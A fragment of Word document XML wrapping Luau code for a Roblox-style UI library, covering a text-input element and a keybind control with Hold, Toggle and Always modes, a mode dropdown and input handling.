      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                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"right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingTop = dim(0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });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function cfg.set(text) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "input" ].Text = text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(text)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items[ "input" ]:GetPropertyChangedSignal("Text"):Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(items[ "input" ].Text) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].Focused:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "input" ].FocusLost:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "input" ], {TextColor3 = rgb(72, 72, 72)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if cfg.default then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set(cfg.default) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:keybind(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = options.flag or library:next_flag(),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or nil, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ignore_key = options.ignore or false, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                key = options.key or nil, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                mode = options.mode or "Toggle",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                active = options.default or false, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                binding = nil, </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                hold_instances = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            flags[cfg.flag] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                mode = cfg.mode,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                key = cfg.key, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                active = cfg.active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-- Component</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "keybind_element" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;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self.items[ "elements" ];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Size = dim2(1,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"name" ]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rgb(245, 245, 245);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "keybind_element" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0,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16;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"name" ];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"right_components" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "keybind_element"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BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;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FillDirection = Enum.FillDirection.Horizontal;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        HorizontalAlignment = Enum.HorizontalAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 7);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"keybind_holder" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;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Parent = items[ "right_components" ];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Size = dim2(0, 0, 0, 16);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Enum.AutomaticSize.X;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(33, 33, 35)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"keybind_holder"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"key" ]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rgb(86, 86, 87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "LSHIFT";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "keybind_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, -12, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutomaticSize = Enum.AutomaticSize.XY;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Parent = items[ "key" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingRight = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });                                  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Mode Holder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "dropdown" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library.items;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Position = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutomaticSize = Enum.AutomaticSize.X;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(0, 0, 0)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items[ "inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "dropdown" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ClipsDescendants = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(22, 22, 24)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"UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingBottom = dim(0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingTop = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 3);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "inline" ]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"UIListLayout" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Padding = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        SortOrder = Enum.SortOrder.LayoutOrder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items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 4)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local options = {"Hold", "Toggle", "Always"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.y_size = 20</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, option in options do                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local name = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextColor3 = rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Text = option;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = items[ "inline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }); cfg.hold_instances[option] = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:apply_theme(name, "accent", "TextColor3")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.y_size += name.AbsoluteSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:create( "UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Parent = name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PaddingTop = dim(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PaddingRight = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            PaddingLeft = dim(0, 5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name.InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                cfg.set(option)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                cfg.set_visible(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                cfg.open = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.modify_mode_color(path) -- ts so frikin tuff 💀</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, v in cfg.hold_instances do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    v.TextColor3 = rgb(72, 72, 72)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.hold_instances[path].TextColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_mode(mode) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.mode = mode </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if mode == "Always" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif mode == "Hold" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag]["mode"] = mode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.modify_mode_color(mode)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(input) == "boolean" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.active = input</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if cfg.mode == "Always" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.active = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif tostring(input):find("Enum") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    input = input.Name == "Escape" and "NONE" or input</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.key = input or "NONE"</w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif find({"Toggle", "Hold", "Always"}, input) then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if input == "Always" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.active = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.mode = input</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_mode(cfg.mode) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif type(input) == "table" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    input.key = type(input.key) == "string" and input.key ~= "NONE" and library:convert_enum(input.key) or input.key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    input.key = input.key == Enum.KeyCode.Escape and "NONE" or input.key</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.key = input.key or "NONE"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.mode = input.mode or "Toggle"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if input.active then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.active = input.active</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_mode(cfg.mode) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.callback(cfg.active)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local text = tostring(cfg.key) ~= "Enums" and (keys[cfg.key] or tostring(cfg.key):gsub("Enum.", "")) or nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local __text = text and (tostring(text):gsub("KeyCode.", ""):gsub("UserInputType.", ""))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "key" ].Text = __text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flags[cfg.flag] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    mode = cfg.mode,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    key = cfg.key, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    active = cfg.active</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_visible(bool)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local size = bool and cfg.y_size or 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "dropdown" ], {Size = dim_offset(items[ "keybind_holder" ].AbsoluteSize.X, size)})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "dropdown" ].Position = dim_offset(items[ "keybind_holder" ].AbsolutePosition.X, items[ "keybind_holder" ].AbsolutePosition.Y + items[ "keybind_holder" ].AbsoluteSize.Y + 60)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "keybind_holder" ].InputBegan:Connect(function(Input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Input.UserInputType ~= Enum.UserInputType.Touch then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "key" ].Text = "..."</w:t>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.binding = library:connection(uis.InputBegan, function(keycode, game_event)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set(keycode.KeyCode ~= Enum.KeyCode.Unknown and keycode.KeyCode or keycode.UserInputType)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.binding:Disconnect() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.binding = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "keybind_holder" ].MouseButton2Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.open = not cfg.open </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                cfg.set_visible(cfg.open)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:connection(uis.InputBegan, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not game_event then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local selected_key = input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode or input.UserInputType</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if selected_key == cfg.key then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.mode == "Toggle" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.active = not cfg.active</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(cfg.active)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        elseif cfg.mode == "Hold" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.set(true)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    </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:connection(uis.InputEnded, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if game_event then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local selected_key = input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode or input.UserInputType</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if selected_key == cfg.key then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if cfg.mode == "Hold" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        cfg.set(false)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cfg.set({mode = cfg.mode, active = cfg.active, key = cfg.key})           </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_flags[cfg.flag] = cfg.set</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:button(options) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
